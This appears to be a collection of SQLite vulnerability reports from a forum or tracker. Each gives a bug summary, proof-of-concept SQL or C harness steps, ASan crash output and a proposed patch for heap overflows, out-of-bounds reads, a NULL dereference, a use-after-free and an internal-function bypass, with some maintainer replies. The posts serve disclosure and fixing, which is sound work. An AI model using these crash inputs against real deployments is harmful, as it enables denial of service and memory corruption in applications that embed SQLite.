Widen n and mult to sqlite3_int64 and add an early-exit guard inside the digit loop so the overflow cannot occur and large values are rejected before reaching memset:
/* os_kv.c: kvvfsDecode() zero-run path */
sqlite3_int64 n = 0;
sqlite3_int64 mult = 1;
while( c>='a' && c<='z' ){
n += (c - 'a') * mult;
if( n > nOut ) return -1;   /* reject before mult itself overflows */
mult *= 26;
c = aIn[++i];
}
if( j + n > nOut ) return -1;

title: Vuln73-54: Heap Buffer Overflow in ext/misc/decimal.c decimal_round via decimal_expand with Hardcoded nFrac=0

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/decimal.c the rounding helper decimal_round() handles the all-leading-nines carry case (lines 320–324) by calling decimal_expand(p, p->nDigit+1, 0) with the fractional-digit argument nFrac hardcoded to 0. Inside decimal_expand() (line 479) this makes nAddFrac = nFrac - p->nFrac = 0 - p->nFrac, which is negative whenever the rounded value has a fractional part (p->nFrac > 0). The buffer is reallocated to only nDigit+1 (= p->nDigit+2) bytes at line 483, after which memmove(p->a+nAddSig, p->a, p->nDigit) (line 490) writes past the buffer and memset(p->a+p->nDigit, 0, nAddFrac) (line 495) is invoked with a negative length that converts to a huge size_t. The decimal extension is statically compiled into this sqlite3 build, so the two-argument rounding function decimal(X, N) is directly callable from SQL with no .load. This is a SQL-reachable heap-buffer-overflow write / wild memset (CWE-787 / CWE-191).

PoC
SQL script (vuln_001.sql):
SELECT decimal('999.999', 3);

Run via the real ASAN-built sqlite3:
/data/ylwang/LargeScan/targets/sqlite/sqlite3 < vuln_001.sql

Trigger output:
=================================================================
==3919160==ERROR: AddressSanitizer: negative-size-param: (size=-1)
#0 0x7f5d9c7b1c87 in __interceptor_memset sanitizer_common_interceptors.inc:799
#1 0x559a15ead2cb in decimal_expand /data/ylwang/LargeScan/targets/sqlite/shell.c:6269
#2 0x559a15ea9e81 in decimal_round /data/ylwang/LargeScan/targets/sqlite/shell.c:6096
#3 0x559a15eb11b2 in decimalFunc /data/ylwang/LargeScan/targets/sqlite/shell.c:6508
#4 0x559a162977c9 in sqlite3VdbeExec /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:104583
#5 0x559a16202d5b in sqlite3Step /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:93593
#6 0x559a162040ab in sqlite3_step /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:93654
#7 0x559a15e8d6e5 in sqlite3_format_query_result /data/ylwang/LargeScan/targets/sqlite/shell.c:3901
#8 0x559a15f6647f in shell_exec /data/ylwang/LargeScan/targets/sqlite/shell.c:28123

0x50200000023c is located 12 bytes inside of 16-byte region [0x502000000230,0x502000000240)
allocated by thread T0 here:
#0 0x7f5d9c82c887 in __interceptor_malloc
#5 0x559a15ea5e1d in decimalNewFromText /data/ylwang/LargeScan/targets/sqlite/shell.c:5859
#6 0x559a15ea85f4 in decimal_new /data/ylwang/LargeScan/targets/sqlite/shell.c:5985
#7 0x559a15eb110e in decimalFunc /data/ylwang/LargeScan/targets/sqlite/shell.c:6504

SUMMARY: AddressSanitizer: negative-size-param in __interceptor_memset
==3919160==ABORTING

(decimal('9.9',1) yields size=-1, decimal('99.99',2) yields size=-2; decimal('999.999',3) most clearly exercises the OOB memmove write.)

Fix
decimal_round() must preserve the existing fractional-digit count when expanding to make room for the new most-significant digit, instead of forcing nFrac to 0:
/* ext/misc/decimal.c: decimal_round(), all-leading-nines branch */
if( i==N ){
decimal_expand(p, p->nDigit+1, p->nFrac);   /* was: ..., 0 */
if( p->oom ) return;
}

With nFrac == p->nFrac, nAddFrac is 0 and only the (positive) significant-digit slot is added, eliminating both the negative-length memset and the over-long memmove.

title: Vuln74-55: NULL Pointer Dereference in ext/misc/explain.c explainFilter Reads argv[0] with argc==0

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/explain.c, explainFilter() (line 202) reads argv[0] unconditionally, but explainBestIndex() only requests an argument when the hidden sql column has a usable == constraint. Scanning the table without such a constraint makes OP_VFilter run with argc==0, so p->apArg is a zero-length array (src/vdbeaux.c:2722) and apArg[0] aliases an adjacent VDBE slot read as a sqlite3_value* (CWE-824). Binding a parameter to integer 0 inside a constraint the vtab leaves unusable makes that slot aVar[0], whose value union is all-zero, so argv[0]==NULL and sqlite3_value_type() dereferences NULL. The explain extension is a standard loadable extension and .load is enabled by default in the shell.

Build
The explain module is built as a standard loadable extension (ASAN/UBSAN to match the main binary):
gcc -g -fsanitize=address -fPIC -shared \
-I/data/ylwang/LargeScan/targets/sqlite \
/data/ylwang/LargeScan/targets/sqlite/ext/misc/explain.c \
-o explain.so

(The main sqlite3 binary already links libasan/libubsan, so the extension is monitored under the real binary's sanitizers.)

PoC
A parameter bound to integer 0 is placed in a rowid constraint. explainBestIndex() only consumes a sql == constraint, so the rowid constraint is unusable and the vtab is filtered with argc==0. Because the statement has a bound parameter (nVar>0), the zero-length apArg aliases aVar[0], the parameter Mem, whose 8-byte value union is 0x00..00:

SQL script (vuln_002.sql):
.load /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_misc_explain/explain.so
.param set :a 0
SELECT * FROM explain WHERE rowid = :a;

Run via the real ASAN/UBSAN-built sqlite3:
/data/ylwang/LargeScan/targets/sqlite/sqlite3 < vuln_002.sql

Trigger output (deterministic across runs):
sqlite3.c:93011:13: runtime error: member access within null pointer of type 'struct sqlite3_value'
EXIT=1

sqlite3.c:93011 is the pVal->flags access inside sqlite3_value_type(). With argv[0]==NULL this dereferences a NULL pointer, which in a non-UBSan/release build is a SIGSEGV reading near address 0. As a negative control, SELECT * FROM explain WHERE sql='SELECT 1'; makes argc==1, supplies a real argv[0], and does not crash (EXIT=0).

Fix
explainFilter() must check argc before touching argv[0]:
/* ext/misc/explain.c: explainFilter() */
static int explainFilter(
sqlite3_vtab_cursor *pVtabCursor,
int idxNum, const char *idxStr,
int argc, sqlite3_value **argv
){
explain_cursor *pCur = (explain_cursor *)pVtabCursor;
...
sqlite3_finalize(pCur->pExplain);
pCur->pExplain = 0;
if( argc<1 || sqlite3_value_type(argv[0])!=SQLITE_TEXT ){   /* was: argc not checked */
pCur->rc = SQLITE_DONE;
return SQLITE_OK;
}
...
}

title: Vuln75-56: Heap Out-of-Bounds Read in ext/misc/nextchar.c findNextChars via Non-Deterministic Field Expression

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/nextchar.c, nextCharFunc() inlines the attacker-controlled field expression F as raw SQL both as the SELECT output column and in the WHERE prefix filter (nextchar.c:246 to 253). findNextChars() (line 184) reads the next UTF-8 char at zOut+p->nPrefix via readUtf8() without checking that sqlite3_column_bytes() exceeds nPrefix, assuming any row that passes the prefix filter is at least nPrefix bytes. A non-deterministic F breaks that assumption: the WHERE evaluation returns a long string that emits a row, while the output-column evaluation returns a string shorter than nPrefix, so readUtf8() reads past the short heap buffer into unmapped memory (CWE-125). The function is registered SQLITE_INNOCUOUS yet F is attacker-controlled text, so this is reachable from pure SQL via the loadable next_char extension.

Buildgcc -g -fsanitize=address -fPIC -shared \
-I/data/ylwang/LargeScan/targets/sqlite \
/data/ylwang/LargeScan/targets/sqlite/ext/misc/nextchar.c \
-o nextchar.so

PoC
The field expression returns a 2,000,000-byte string when evaluated in the WHERE filter (passing the F >= prefix||char(1) lower bound and emitting a row) but a 1-byte string when evaluated as the output column, decoupled via abs(random())%2. The prefix is enlarged to ~1,000,000 bytes so the over-read overruns SQLite's over-allocated value buffer / ASan redzone and faults in an unmapped page. The trigger is probabilistic (~1/2 per call), so the SELECT is repeated so a hit is near-certain.

SQL script (vuln_001.sql, abbreviated):
.load /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_misc_nextchar/nextchar.so
CREATE TABLE d(w);
INSERT INTO d VALUES(1);
SELECT length(next_char(
printf('%.*c',1000000,'A'),
'd',
'substr(printf(''%.*c'',2000000,''A''),1, CASE (abs(random())%2) WHEN 0 THEN 1000001 ELSE 1 END)'
));
-- repeated ~20 times so the probabilistic split hits

Run via the real ASAN-built sqlite3:
/data/ylwang/LargeScan/targets/sqlite/sqlite3 < vuln_001.sql

Trigger output:
run-1
1
run-2
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3143100==ERROR: AddressSanitizer: SEGV on unknown address 0x52e0000fdfe8
==3143100==The signal is caused by a READ memory access.
#0 0x7fc0da7a4958 in readUtf8 (nextchar.so+0x1958)
#1 0x7fc0da7a4f9c in findNextChars (nextchar.so+0x1f9c)
#2 0x7fc0da7a5c2d in nextCharFunc (nextchar.so+0x2c2d)
#3 0x55d50bc327c9 in sqlite3VdbeExec /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:104619
#4 0x55d50bb9dd5b in sqlite3Step /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:93624
#5 0x55d50bb9f0ab in sqlite3_step /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:93685
#6 0x55d50b8286e5 in sqlite3_format_query_result /data/ylwang/LargeScan/targets/sqlite/shell.c:3901
#7 0x55d50b90147f in shell_exec /data/ylwang/LargeScan/targets/sqlite/shell.c:28123
#8 0x55d50b966420 in runOneSqlLine /data/ylwang/LargeScan/targets/sqlite/shell.c:37462

SUMMARY: AddressSanitizer: SEGV (nextchar.so+0x1958) in readUtf8
==3143100==ABORTING

Fix
findNextChars() must verify the column is longer than the prefix before reading past it:
/* ext/misc/nextchar.c: findNextChars() */
const unsigned char *zOut = sqlite3_column_text(p->pStmt, 0);
int nOut = sqlite3_column_bytes(p->pStmt, 0);
unsigned cNext;
if( nOut<=p->nPrefix ){            /* row shorter than prefix: skip */
sqlite3_reset(p->pStmt);
continue;
}
n = readUtf8(zOut+p->nPrefix, &cNext);

title: Vuln77-58: Heap Out-of-Bounds Read in ext/misc/fuzzer.c fuzzerDequote Missing NUL Terminator

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/fuzzer.c, fuzzerDequote() (lines 449 to 473) dequotes a quoted argument by copying bytes between the surrounding quotes, but it writes a terminating NUL only in the unquoted branch (memcpy(zOut, zIn, nIn+1), line 459). In the quoted branch (lines 460 to 468) it copies characters in a loop and never writes zOut[iOut]=0, so when the closing quote is not the last input character (for example 'a'b, "abc"x, [a]b), the trailing bytes are copied and zOut is left un-terminated. The vtab parser captures the raw multi-token byte span, so such arguments reach fuzzerConnect() (line 529) verbatim and fuzzerDequote(argv[3]) returns the un-terminated buffer. fuzzerLoadRules() (line 363) then formats it with sqlite3_mprintf("SELECT * FROM %Q.%Q", zDb, zData) (line 374), and %Q scans zData for a NUL, reading past the end of the heap allocation (CWE-125). next_char is not involved; this is reached from a single CREATE VIRTUAL TABLE ... USING fuzzer(...) statement via the loadable fuzzer extension.

Buildgcc -g -fsanitize=address -fPIC -shared \
-I/data/ylwang/LargeScan/targets/sqlite \
/data/ylwang/LargeScan/targets/sqlite/ext/misc/fuzzer.c \
-o fuzzer.so

(The main sqlite3 binary already links libasan, so the extension is monitored under the real binary's sanitizer.)

PoC
Each statement passes a quoted argument followed by extra characters, with long trailing runs so the un-terminated region reaches the end of the rounded allocation and the over-read lands in the ASan redzone.

SQL script (vuln_001.sql):
.load /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_misc_fuzzer/fuzzer.so
CREATE VIRTUAL TABLE f1 USING fuzzer('aaaaaaaaaaaaaaaa'bbbbbbbbbbbbbbbb);
CREATE VIRTUAL TABLE f2 USING fuzzer("xxxxxxxxxxxxxxxx"yyyyyyyyyyyyyyyy);
CREATE VIRTUAL TABLE f3 USING fuzzer([aaaaaaaaaaaaaaaa]bbbbbbbbbbbbbbbb);
CREATE VIRTUAL TABLE f4 USING fuzzer('a'b);

Run via the real ASAN-built sqlite3:
/data/ylwang/LargeScan/targets/sqlite/sqlite3 < vuln_001.sql

Trigger output:
==3268316==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x504000001d80
READ of size 1 at 0x504000001d80 thread T0
#0 ... in sqlite3_str_vappendf /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:33469
#1 ... in fuzzerLoadRules ext/misc/fuzzer.c:374
#2 ... in fuzzerConnect   ext/misc/fuzzer.c:533
SUMMARY: AddressSanitizer: heap-buffer-overflow sqlite3.c:33469 in sqlite3_str_vappendf
==3268316==ABORTING

Fix
fuzzerDequote() must NUL-terminate the output in the quoted branch:
/* ext/misc/fuzzer.c: fuzzerDequote(), quoted branch */
if( q=='[' ) q = ']';
for(iIn=1; iIn<nIn; iIn++){
if( zIn[iIn]==q ) iIn++;
zOut[iOut++] = zIn[iIn];
}
zOut[iOut] = 0;     /* terminate even when extra bytes follow the close quote */

title: Vuln78-59: Heap Out-of-Bounds Read in src/os_kv.c kvvfsDecodeJournal Base-26 Length Parser Missing Separator Guard

posts.author: ylwang (yuelinwang)
posts.body:
Summary
kvvfsDecodeJournal() in src/os_kv.c decodes a journal record whose text is a little-endian base-26 size prefix, a single space separator, then the hex-encoded journal. The prefix loop at line 518 is while( (c = zTxt[i++])>='a' && c<='z' ) with no guard that the separator (or buffer end) was reached. kvvfsReadJrnl() allocates the text buffer as sqlite3_malloc64(szTxt+1) and NUL-terminates it at aTxt[szTxt]. If the journal record is pure [a-z] with no space separator, the loop consumes the terminating NUL (which is not in [a-z], so it stops, but only after i++ has advanced past it) and leaves i == szTxt+1. The decode call kvvfsDecode(zTxt+i, ...) at line 529 then starts reading at aTxt[szTxt+1], one byte past the szTxt+1-byte buffer (CWE-125). The journal record is attacker-controlled persistent state, and the over-read is reached on the normal hot-journal recovery path when the database is opened.

Build
os_kv.c only compiles under SQLITE_OS_KV / SQLITE_OS_KV_OPTIONAL, so the kvvfs VFS is not present in the default ./sqlite3. As with Vuln71 and Vuln72, the PoC uses the ASAN sqlite3_kvvfs binary:
gcc -g -fsanitize=address -DSQLITE_OS_KV_OPTIONAL \
-I. sqlite3.c shell.c -o sqlite3_kvvfs -ldl -lpthread -lm

PoC
kvvfs stores each key/value as a file kvvfs-<class>-<key> in the cwd, and kvvfsOpen() only accepts the class names local or session. Two details make the over-read observable: (1) the decoded size n must be small so sqlite3_malloc64(n) succeeds and the decode actually runs (a long all-letter prefix overflows the 32-bit n and malloc fails first), and (2) szTxt+1 must be a multiple of 8 so sqlite3_malloc's ROUND8 rounding leaves no slack and the over-read lands in the ASan redzone. A 7-byte journal baaaaaa (base-26 value 1, malloc(8)) satisfies both.
KV=/data/ylwang/LargeScan/targets/sqlite/sqlite3_kvvfs
cd "$(mktemp -d)"
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=1

# 1) build a real kvvfs database (class must be 'local' or 'session')
"$KV" 'file:local?vfs=kvvfs&mode=rwc' \
"PRAGMA page_size=512; CREATE TABLE t(x INTEGER); INSERT INTO t VALUES(42);"

# 2) inject a malicious journal record: pure [a-z], no ' ' separator, length 7
printf 'baaaaaa' > kvvfs-local-jrnl

# 3) reopen -> hasHotJournal -> kvvfsReadJrnl -> kvvfsDecodeJournal -> OOB read
"$KV" 'file:local?vfs=kvvfs' "SELECT x FROM t;"

Trigger output:
=================================================================
==3529635==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000160
READ of size 1 at 0x502000000160 thread T0
#0 in kvvfsDecode          /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:39764
#1 in kvvfsDecodeJournal    /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:39823
#2 in kvvfsReadJrnl         /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:39890
#3 in sqlite3OsRead         /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:27508
#4 in hasHotJournal         /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:63862
#5 in sqlite3PagerSharedLock /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:63946
#6 in lockBtree             /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:75501

0x502000000160 is located 0 bytes to the right of 16-byte region [0x502000000150,0x502000000160)
allocated by kvvfsReadJrnl /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:39885

SUMMARY: AddressSanitizer: heap-buffer-overflow sqlite3.c:39764 in kvvfsDecode
==3529635==ABORTING

Fix
Stop the base-26 prefix loop on the NUL terminator (and require the space separator) so it cannot advance past the text buffer:
/* src/os_kv.c: kvvfsDecodeJournal() */
i = 0;
mult = 1;
while( (c = zTxt[i])>='a' && c<='z' ){   /* read, then advance only on success */
n += (c - 'a')*mult;
mult *= 26;
i++;
}
if( zTxt[i]!=' ' ){ pFile->nJrnl = 0; return; }  /* require the separator */
i++;

title: Heap Use-After-Free in sqlite3_backup_step() via Attached Database Realloc

posts.author: drh
posts.body:
Summary
sqlite3_backup on the current tree can dereference a dangling Db * when the backup source is an attached database and the source connection performs additional ATTACH operations before sqlite3_backup_step(). This results in a heap-use-after-free in the backup path.

The issue is reachable through documented use of the source connection during backup and does not rely on misuse of the destination connection.

Details
The affected logic is the backup handle's caching of source and destination database slots.

When sqlite3_backup_init(dst, "main", src, "aux") is called, the handle stores a pointer to src->aDb[...]. For attached databases, that slot lives inside the dynamically resized sqlite3.aDb array. Subsequent ATTACH operations on the source connection can reallocate aDb, leaving the cached pointer stale.

Local ASAN testing against the current tree reproduced:

backup initialization from attached source database aux
multiple valid source-side ATTACH operations
heap-use-after-free in sqlite3_backup_step()
allocator history showing the free happening inside sqlite3DbRealloc() from attachFunc()

This is a public C API issue and does not require malformed SQL syntax or a corrupt database file.

PoC

Open source and destination connections.
On the source, ATTACH an auxiliary database as aux and create table content there.
Call sqlite3_backup_init(dst, "main", src, "aux").
Perform additional ATTACH operations on the source connection.
Call sqlite3_backup_step(b, -1).
Observe ASAN report heap-use-after-free in sqlite3_backup_step().

The harness xuexi-sqlite/xuexi/probes/backup_source_attach_realloc_asan.c reproduces this on the current tree.

Impact
Applications that expose or internally drive this backup API sequence with attacker-controlled timing or database names may be vulnerable to denial of service and potentially stronger exploitation from a dangling-pointer read. The trust boundary crossed is SQLite's public backup API assuming stability of a Db * that actually resides inside a movable owner array.

The present reproduction shows a reliable UAF read and crash. Stable arbitrary write or code execution was not demonstrated.

Disclosure Status
This issue has not been publicly disclosed.

Reporter
Reported by:

Hcamael (@Hcamael)
章鱼哥 (@aipy) （www.aipyaipy.com）

posts.author: dan
posts.body: Fixed here: https://sqlite.org/src/info/e5db80350c

title: Denial of Service in FTS5 via Corrupted nPgTombstone Integer Overflow in Tombstone Rebuild

posts.author: drh
posts.body:
Summary
SQLite FTS5 contentless-delete handling can still be driven into failure when corrupt structure metadata sets nPgTombstone to an extreme value. A crafted FTS5 %_data structure record reaches the tombstone rebuild path, and the ordinary sqlite3 shell exits with a segmentation-fault status when the proof of concept issues the final DELETE.

This is observable without ASAN by using a plain shell build with FTS5 enabled.

Details
The affected area is the FTS5 structure parsing and tombstone maintenance path reached during contentless-delete handling.

The reproduced path:

creates a contentless-delete FTS5 table
enables secure-delete behavior
corrupts the structure record in ft_data so the segment's nPgTombstone decodes to 2147483647
inserts a crafted tombstone page
performs DELETE FROM ft WHERE rowid=2147483647

When this sequence is run through a plain non-ASAN shell built with -DSQLITE_ENABLE_FTS5, the shell terminates abnormally with exit status 139.

This plain-shell crash is more important for triage than the earlier UBSAN message, because it shows the issue is not limited to sanitizer instrumentation.

PoC

Build a normal SQLite shell with FTS5 enabled.
Run the supplied SQL probe:

/tmp/sqlite3_plain_ext :memory: < \
xuexi-sqlite/xuexi/probes/fts5_tombstone_npgtombstone_overflow_asan.sql

Observe that the shell does not complete normally.
Confirm the process exits with:

EXIT:139

The SQL payload corrupts ft_data directly and then triggers tombstone rebuild via DELETE.

Impact
For applications that open and modify attacker-controlled SQLite databases with FTS5 enabled, this issue can result in denial of service. The trust boundary being crossed is corrupt on-disk or shadow-table metadata entering write-path maintenance logic without a safe bound.

The current plain-shell evidence supports a real crash in a non-ASAN build. This is stronger than a sanitizer-only signed-overflow report, though it still centers on denial of service rather than a demonstrated arbitrary-write primitive.

Disclosure Status
This issue has not been publicly disclosed.

Reporter

title: Heap Buffer Overflow in sqlite3changegroup_change_blob via Negative Length Parameter

posts.author: drh
posts.body:
Summary
The session extension's one-at-a-time changegroup API accepts a negative blob length in sqlite3changegroup_change_blob(). In the current tree, that signed int still flows into memcpy() as a size argument and can result in memory corruption or process termination in applications that expose this API to attacker-controlled input.

This is a C API issue rather than a direct SQL-only issue, but it crosses a trust boundary inside a public SQLite session API.

Details
The affected component is ext/session/sqlite3session.c, specifically sqlite3changegroup_change_blob().

sqlite3changegroup_change_text() intentionally accepts negative lengths to mean NUL-terminated text, but sqlite3changegroup_change_blob() has no such documented contract. The current implementation still computes a small allocation/check size using signed arithmetic and then passes nVal to memcpy() without rejecting negative values first.

A local ASAN harness against the current tree reproduces:

sqlite3changegroup_change_blob(..., nVal=-1)
AddressSanitizer: negative-size-param
the faulting sink at sqlite3changegroup_change_blob() on the memcpy() call

The issue requires the application to enable the session extension and to expose the one-at-a-time changegroup construction API to untrusted input.

PoC

Build SQLite with -DSQLITE_ENABLE_SESSION -DSQLITE_ENABLE_PREUPDATE_HOOK.
Compile xuexi-sqlite/xuexi/probes/session_change_blob_negative_asan.c against the current sqlite3.c.
Run the harness under ASAN.
Observe the call to sqlite3changegroup_change_blob(grp, 1, 1, ptr, -1).
Confirm ASAN reports negative-size-param in memcpy().

Minimal command line:
cc -fsanitize=address,undefined -g -O1 -fno-omit-frame-pointer \
-U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 \
-DSQLITE_ENABLE_SESSION -DSQLITE_ENABLE_PREUPDATE_HOOK \
-DSQLITE_OMIT_LOOKASIDE=1 -I. \
sqlite3.c xuexi-sqlite/xuexi/probes/session_change_blob_negative_asan.c \
-ldl -lpthread -lm -lz \
-o /tmp/session_change_blob_negative_asan

ASAN_OPTIONS=detect_leaks=0:halt_on_error=1:abort_on_error=1 \
UBSAN_OPTIONS=halt_on_error=1:abort_on_error=1 \
/tmp/session_change_blob_negative_asan

Impact
If an application lets an attacker influence the sqlite3changegroup_change_blob() length argument, the issue may allow out-of-bounds reads or writes and can result in a crash. The bug is not reachable from ordinary SQL alone, but it is reachable through a public SQLite C API in the session extension.

The most defensible impact statement is memory corruption or denial of service in hosts that expose this API boundary. Stable code execution was not demonstrated.

Disclosure Status
This issue has not been publicly disclosed.

Reporter
Reported by:

Hcamael (@Hcamael)
章鱼哥 (@aipy) （www.aipyaipy.com）

posts.author: drh
posts.body:
NOT A BUG
The session_change_blob_negative_asan.c test program was not included in the submission so
we can not double-check these results.  However, by the reporters own admission, this appears
to be an API misuse problem, not a problem in the code.  The complaint is that the
sqlite3changegroup_change_blob() interface crashes when given a negative or otherwise
incorrect size parameter.
But you say the same thing about the standard library function memcpy().  Is SQLite to be held
to higher standards than the standard library?

title: Heap Buffer Overflow Read in intckGetToken() via Unterminated Bracket Identifier

posts.author: drh
posts.body:
Summary
The optional incremental integrity-check extension still mishandles unterminated bracket identifiers in parse_create_index(). On the current tree, a token ending in [ reaches intckGetToken() and causes a heap-buffer-overflow read.

The same local reproduction also shows that the helper remains callable after sqlite3_intck_close(), which widens the exposure window on a connection where the extension was previously opened.

Details
The affected component is ext/intck/sqlite3intck.c.

The scanner's bracket branch still uses:
while( z[iRet++]!=']' && z[iRet] );

This mixes post-incremented and current reads in one expression. When the token ends at the input NUL byte, the second read steps past the buffer end. The current tree still exposes this through the SQL helper parse_create_index(sql, icol) registered by sqlite3_intck_open().

Local ASAN testing reproduced:

successful execution of parse_create_index('CREATE INDEX i1(a)',0)
heap-buffer-overflow on parse_create_index('CREATE INDEX i1([',0)
the crash site at intckGetToken() line 331
the same behavior after sqlite3_intck_close()

PoC

Build the current tree with ASAN and compile ext/intck/sqlite3intck.c.
Open an in-memory database.
Call sqlite3_intck_open(db, "main", &pCk).
Optionally call sqlite3_intck_close(pCk).
Execute:

SELECT parse_create_index('CREATE INDEX i1([',0);

Observe the heap-buffer-overflow in intckGetToken().

Impact
This issue can result in denial of service and limited out-of-bounds reads in applications that include and expose the intck extension. The trust boundary crossed is a connection-level helper function operating on attacker-controlled SQL text without safe token-end handling.

The current evidence supports crash and OOB-read impact. Stronger exploitation was not demonstrated.

This issue has not been publicly disclosed.

title: Internal Function Execution Bypass via DEFAULT() Expression in Schema

posts.author: drh
posts.body:
Summary
SQLite currently rejects direct SQL calls to internal-use-only helpers such as sqlite_rename_table(), but the same restriction can still be bypassed through DEFAULT(...) expressions stored in schema. A crafted CREATE TABLE or ALTER TABLE ... ADD COLUMN ... DEFAULT(...) statement can persist an internal helper invocation and later execute it during INSERT.

This behavior is observable with the ordinary sqlite3 shell and does not depend on ASAN.

Details
The issue affects the path that stores default-value expressions in schema and the later INSERT path that evaluates them.

On the current tree:

direct SELECT sqlite_rename_table(...) is rejected with no such function
DEFAULT(sqlite_rename_table(...)) is accepted and stored in sqlite_schema
a later INSERT executes the internal helper and returns its transformed SQL text

This shows that SQLite enforces the internal-function boundary for ordinary direct calls, but not for the DEFAULT(...) storage path. Once such an expression is stored, later INSERT statements evaluate it as a default value.

Plain-shell validation on SQLite 3.54.0 reproduced:

Parse error ... no such function: sqlite_rename_table for direct invocation
CREATE TABLE t1(x, y DEFAULT(sqlite_rename_table(...))) appearing in schema
SELECT quote(y) FROM t1; returning 'CREATE TABLE "b"(b)' after INSERT

This is a real execution-boundary bypass, not just a sanitizer artifact.

PoC
Run the following in the ordinary sqlite3 shell:
SELECT sqlite_rename_table('main','table','t','CREATE TABLE a(b)','a','b',0);

CREATE TABLE t1(x);
ALTER TABLE t1 ADD COLUMN y DEFAULT(
sqlite_rename_table('main','table','t','CREATE TABLE a(b)','a','b',0)
);
SELECT sql FROM sqlite_schema WHERE name='t1';
INSERT INTO t1(x) VALUES(1);
SELECT quote(y) FROM t1;

Expected observable behavior on the current tree:

the first statement is rejected as no such function
the schema row still stores DEFAULT(sqlite_rename_table(...))
the final SELECT quote(y) returns 'CREATE TABLE "b"(b)'

Impact
This issue may allow unauthorized execution of internal-only SQLite helper functions from attacker-controlled schema DDL. The trust boundary being crossed is SQLite's own internal-function restriction, not merely application-level SQL injection semantics.

The strongest plain-shell evidence currently shows persistent execution of internal helpers through stored default expressions. That is enough to justify treating this as a real boundary bypass. A stronger memory-corruption primitive was not required for this claim.

Disclosure Status
This issue has not been publicly disclosed.

Reporter
Reported by:

Hcamael (@Hcamael)
章鱼哥 (@aipy) （www.aipyaipy.com）

title: Out-of-Bounds Read in qpvtab via Unmapped Rowid Sentinel in xBestIndex()

posts.author: drh
posts.body:
Summary
The optional qpvtab extension does not correctly handle rowid constraints in xBestIndex(). When SQLite supplies iColumn == -1 for a rowid constraint, the extension uses that value as an index into its local column-name array, producing invalid output and indicating an out-of-bounds read.

This is observable with the ordinary sqlite3 shell once the extension is loaded. It does not require ASAN to show anomalous behavior, though the extension is not part of SQLite's default core surface.

Details
The affected component is ext/misc/qpvtab.c.

SQLite's virtual table interface uses iColumn == -1 to represent rowid constraints. The current qpvtabBestIndex() path does not remap that sentinel before indexing azColname[].

Plain-shell validation with a non-ASAN qpvtab shared object reproduced the issue by loading the extension and executing:
SELECT vn, ix, cn, op, ux, rhs
FROM qpvtab
WHERE rowid > 0
LIMIT 5;

The first output row contained a corrupted cn field instead of a valid column name:
aConstraint|0|�^O^^��=�/|4|1|0

That is consistent with the extension interpreting memory adjacent to azColname[] as a string when processing the rowid constraint.

PoC

Build ext/misc/qpvtab.c as a normal shared object.
Start the ordinary sqlite3 shell with extension loading enabled.
Load the extension with its explicit init symbol:

.load /tmp/qpvtab_plain sqlite3_qpvtab_init
SELECT vn, ix, cn, op, ux, rhs
FROM qpvtab
WHERE rowid > 0
LIMIT 5;

Observe that the first row prints a corrupted cn value instead of a valid column name such as rowid.

Impact
This issue can result in out-of-bounds reads and unstable behavior in deployments that load qpvtab. The affected trust boundary is the virtual-table planner callback receiving legal SQLite planner input and mishandling the rowid sentinel.

The current plain-shell evidence supports a real OOB-read side effect, but this remains a weaker candidate than a core-library crash because it depends on an optional extension and, in non-ASAN testing, currently manifests as corrupted output rather than a stable crash.

Disclosure Status
This issue has not been publicly disclosed.

Reporter
Reported by:

Hcamael (@Hcamael)
章鱼哥 (@aipy) （www.aipyaipy.com）

title: Vuln79-60: Heap Out-of-Bounds Read in ext/misc/spellfix.c spellfix1FilterForMatch Missing nPattern>0 Guard

posts.author: ylwang (yuelinwang)
posts.body:
Summary
spellfix1FilterForMatch() in ext/misc/spellfix.c (line 2607) reads zPattern[nPattern-1] without a nPattern>0 guard. When the MATCH operand is empty or transliterates to a leading NUL byte, strlen(zPattern)==0 and zPattern[-1] reads one byte before the heap allocation (CWE-125).

Build
The default ./sqlite3 allocator prepends an 8-byte size header, causing the underflow to land inside the live allocation and evade ASAN. A dedicated shell built with -DSQLITE_MALLOCSIZE=malloc_usable_size uses raw malloc() and exposes the redzone:
gcc -g -fsanitize=address -fno-omit-frame-pointer \
-DSQLITE_MALLOCSIZE=malloc_usable_size \
-I. sqlite3.c shell.c \
-o sqlite3_asan_spellfix -ldl -lpthread -lm

PoC
SQL script (vuln_001.sql):
.load /data/ylwang/LargeScan/targets/sqlite/spellfix_asan.so sqlite3_spellfix_init
CREATE VIRTUAL TABLE sf USING spellfix1;
INSERT INTO sf(word) VALUES('hello');
INSERT INTO sf(word) VALUES('world');
SELECT word FROM sf WHERE word MATCH '';

Run via the sqlite3_asan_spellfix shell:
/data/ylwang/LargeScan/targets/sqlite/sqlite3_asan_spellfix \
/data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_misc_spellfix/vuln_001.sql

Trigger output:
=================================================================
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000daf
READ of size 1 at 0x502000000daf thread T0
#0 in spellfix1FilterForMatch  ext/misc/spellfix.c:2607
#1 in spellfix1Filter          ext/misc/spellfix.c:2699
...
